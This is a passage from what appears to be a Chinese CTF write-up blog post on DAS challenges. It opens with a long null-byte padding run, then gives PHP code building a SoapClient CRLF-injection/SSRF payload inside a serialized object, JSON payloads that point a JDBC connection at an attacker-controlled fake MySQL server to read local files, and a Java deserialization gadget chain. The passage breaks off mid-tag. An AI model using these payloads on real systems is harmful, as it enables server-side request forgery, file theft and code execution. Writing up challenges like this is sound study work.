0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\r\n--0f9486e921f5468f9ab50745c4c93267--\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&quot;http://127.0.0.1/siranai.php&quot;</span>, <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;shanghe\r\n&quot;</span> . <span class="string">&quot;Cookie: PHPSESSION=16aaab9fb\r\nContent-Type: multipart/form-data; boundary=&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$postdata</span>,<span class="number">2</span>,<span class="number">32</span>).<span class="string">&quot;\r\nConnection: keep-alive\r\nAccept: */*\r\nContent-Length: 10416&quot;</span>.<span class="string">&quot;\r\n\r\n&quot;</span>.<span class="variable">$postdata</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;http://127.0.0.1/siranai.php&quot;</span>));</span><br><span class="line">&#125; <span class="keyword">catch</span> (SoapFault <span class="variable">$e</span>) &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">siroha</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;koi=[<span class="string">&quot;zhanjiangdiyishenqing&quot;</span>=&gt;[<span class="variable">$a</span>,<span class="string">&quot;nnnnn&quot;</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure><p>这 nm 真抽象，👴搞出来，自己都绷不住了.</p><p>但是👴打进去，文件被替换，那种终出的感觉，真√⑧爽！！！1</p><h1 id="ezfastjson"><span id="ezfastjson"> Ezfastjson</span></h1><p>shanhegiegie 出的黑盒 (大概) java, 刚好内容是我学过的，我可太喜欢了🥰🥰🥵</p><p>本地起个<a href="https://github.com/fnmsd/MySQL_Fake_Server"> msql_fake_server</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;host&quot;</span>:<span class="string">&quot;vps:3307/test?user=fileread_netdoc:///&amp;ALLOWLOADLOCALINFILE=true&amp;maxAllowedPacket=655360&amp;allowUrlInLocalInfile=true#&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>读啥文件都行，除了 flag,</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;host&quot;</span>:<span class="string">&quot;vps:3307/test?user=fileread_netdoc:///app/ezfastjson-0.0.1-SNAPSHOT.jar&amp;ALLOWLOADLOCALINFILE=true&amp;maxAllowedPacket=655360&amp;allowUrlInLocalInfile=true#&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>源码鉴赏一波<img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/1701412058276.png" alt="1701412058276"></p><p><s>你⛰🎁giegie 脑抽了</s></p><p>把 waf 写在了 parseObject 之后，那不直接打完反序列化漏洞再检测吗，跟没有一样.</p><p>所以可以直接打 JNDI, 不过这不是重点，重点是预期解，预期解的链子比较有意思.</p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/1701412219014.png" alt="1701412219014"></p><p>这是黑名单，基本上是把 readobject 到 tostring 给 ban 了.</p><p>不过还有最终武器，👴马上就掏出来给你看看！！！</p><p>就是 NEEPUCTF 中 Nomap 的那条链.</p><h2 id="nomap"><span id="nomap"> Nomap</span></h2><p>调用链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">javax.swing.AbstractAction<span class="comment">#readObject -&gt; </span></span><br><span class="line">javax.swing.AbstractAction<span class="comment">#putValue -&gt;</span></span><br><span class="line">javax.swing.AbstractAction<span class="comment">#firePropertyChange -&gt; </span></span><br><span class="line">java.lang.Object<span class="comment">#equals</span></span><br></pre></td></tr></table></figure><p>这 beyond÷ 玩意需要重写 writeObject, 那么改 writeObject 方法比较多，但是 javassist 貌似用不了，需要使用 agent 去修改.</p><p>谁都没有想到，我们至尊的大 B 老师使用本地重新写个一模一样的类去修改，yahari, 高端的方法往往只需要朴素的操作.🤣</p><p>看看 <code>javax.swing.AbstractAction#readObject</code></p><h3 id="参考文献"><span id="参考文献"> 参考文献😊</span></h3><p><a href="https://aecous.github.io/2023/04/24/%E4%B8%80%E6%9D%A1%E6%8A%BD%E8%B1%A1%E7%9A%84equals%E8%A7%A6%E5%8F%91%E9%93%BE/">一条抽象的 equals 触发链 | Prove yourself (aecous.github.io)</a></p><p>[NeepuCTF2023 公开赛 Writeup - Boogiepop Doesn’t Laugh (<a href="http://boogipop.com">boogipop.com</a>)](<a href="https://boogipop.com/2023/05/21/NeepuCTF2023">https://boogipop.com/2023/05/21/NeepuCTF2023</a> 公开赛 Writeup/)</p><p>👴来看看怎么个事</p><h3 id="调用链"><span id="调用链"> 调用链</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">javax.swing.AbstractAction<span class="comment">#readObject -&gt; </span></span><br><span class="line">javax.swing.AbstractAction<span class="comment">#putValue -&gt;</span></span><br><span class="line">javax.swing.AbstractAction<span class="comment">#firePropertyChange -&gt; </span></span><br><span class="line">java.lang.Object<span class="comment">#equals</span></span><br></pre></td></tr></table></figure><p>这 beyond÷ 玩意需要重写 writeObject, 那么改 writeObject 方法比较多，但是 javassist 貌似用不了，需要使用 agent 去修改.</p><p>谁都没有想到，我们至尊的大 B 老师使用本地重新写个一模一样的类去修改，yahari, 高端的方法往往只需要朴素的操作.🤣</p><p>看看 <code>javax.swing.AbstractAction#readObject</code></p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/1699834640583.png" alt="1699834640583"></p><p>再看看 <code>javax.swing.AbstractAction#putValue</code></p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/1699834775607.png" alt="1699834775607"></p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/1699834876739.png" alt="1699834876739"></p><p>触发 equals,equals 可以触发 Xstring 的 equals 从而调用任意 getters.</p><p>由于是抽象类，需要找到其子类</p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/1699835790399.png" alt="1699835790399"></p><p>选择 AlignmentAction.</p><h3 id="writeobject"><span id="writeobject"> writeObject</span></h3><p><code>AlignmentAction</code>  在进行构造函数调用的时候，会不断向上去调用父类的方法</p><p><img src="/2023/12/01/%E5%85%B3%E4%BA%8EDAS%E7%9A%84%E5%B0%8F%E8%AE%B0/1699836526844.png" 